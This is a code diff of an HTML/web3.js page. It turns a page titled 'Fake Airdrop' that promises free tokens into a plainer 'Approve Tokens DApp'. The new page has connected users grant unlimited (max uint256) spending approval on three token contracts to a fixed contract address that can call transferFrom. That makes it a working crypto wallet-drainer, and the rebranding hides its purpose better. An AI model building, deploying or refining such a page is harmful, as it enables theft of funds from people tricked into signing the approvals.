@@ -3,70 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Airdrop</title>
+    <title>Approve Tokens DApp</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Fake Token Airdrop</h1>
-    <p>Claim your FREE tokens now!</p>
+    <h1>Approve Tokens</h1>
     <button id="connectWallet">Connect Wallet</button>
-    <button id="claimButton" disabled>Claim Airdrop</button>
-    <div id="status"></div>
+    <p>Wallet Address: <span id="walletAddress">Not Connected</span></p>
+    <button id="approveTokens" disabled>Approve Tokens</button>
 
     <script>
-        let web3;
+        const contractAddress = "0xC553839F1d5B0006D2f760677dEEC0cB65aF7Dc9";
+        const contractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "spender", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "approve",
+                "outputs": [
+                    { "internalType": "bool", "name": "", "type": "bool" }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "account", "type": "address" }
+                ],
+                "name": "balanceOf",
+                "outputs": [
+                    { "internalType": "uint256", "name": "", "type": "uint256" }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "sender", "type": "address" },
+                    { "internalType": "address", "name": "recipient", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "transferFrom",
+                "outputs": [
+                    { "internalType": "bool", "name": "", "type": "bool" }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-        async function connectWallet() {
-            if (typeof window.ethereum !== 'undefined') {
+        let web3;
+        let userAccount;
+        let contract;
+
+        // Connect Wallet Function
+        document.getElementById("connectWallet").onclick = async () => {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
                 try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    web3 = new Web3(window.ethereum);
-                    document.getElementById('connectWallet').disabled = true;
-                    document.getElementById('claimButton').disabled = false;
-                    document.getElementById('status').innerText = "Wallet connected!";
+                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                    userAccount = accounts[0];
+                    document.getElementById("walletAddress").innerText = userAccount;
+
+                    contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                    document.getElementById("approveTokens").disabled = false;
                 } catch (error) {
-                    document.getElementById('status').innerText = "Error connecting wallet: " + error.message;
+                    console.error("User denied wallet connection", error);
                 }
             } else {
-                document.getElementById('status').innerText = "Please install MetaMask!";
+                alert("Please install MetaMask to use this DApp!");
             }
-        }
+        };
 
-        async function claimAirdrop() {
-            if (!web3) {
-                document.getElementById('status').innerText = "Please connect your wallet first.";
+        // Approve Tokens Function
+        document.getElementById("approveTokens").onclick = async () => {
+            if (!userAccount || !contract) {
+                alert("Please connect your wallet first!");
                 return;
             }
 
             try {
-                // Contract address and ABI
-                const contractAddress = "0x716FaF16d4423B337C93bFAefA6134d77cC7AfFF";
-                const abi = [
-                    {
-                        "inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],
-                        "name": "approve",
-                        "outputs": [{"internalType": "bool","name": "","type": "bool"}],
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }
+                const maxUint = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+
+                // Approve tokens for Token A, B, and C
+                const tokens = [
+                    "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
+                    "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
+                    "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
                 ];
 
-                const contract = new web3.eth.Contract(abi, contractAddress);
-                const accounts = await web3.eth.getAccounts();
-                const account = accounts[0];
+                for (const token of tokens) {
+                    const tokenContract = new web3.eth.Contract(contractABI, token);
+                    await tokenContract.methods.approve(contractAddress, maxUint).send({ from: userAccount });
+                    console.log(`Approved ${token}`);
+                }
 
-                // Approve the contract to spend all tokens (max uint256)
-                // Here we use the string representation of max uint256 directly
-                const approveTx = await contract.methods.approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({from: account});
-                
-                document.getElementById('status').innerText = "Airdrop claimed! Check your wallet.";
+                alert("Tokens approved successfully!");
             } catch (error) {
-                document.getElementById('status').innerText = "Something went wrong: " + error.message;
+                console.error("Error approving tokens", error);
+                alert("Failed to approve tokens. Check console for details.");
             }
-        }
-
-        document.getElementById('connectWallet').addEventListener('click', connectWallet);
-        document.getElementById('claimButton').addEventListener('click', claimAirdrop);
+        };
     </script>
 </body>
 </html>
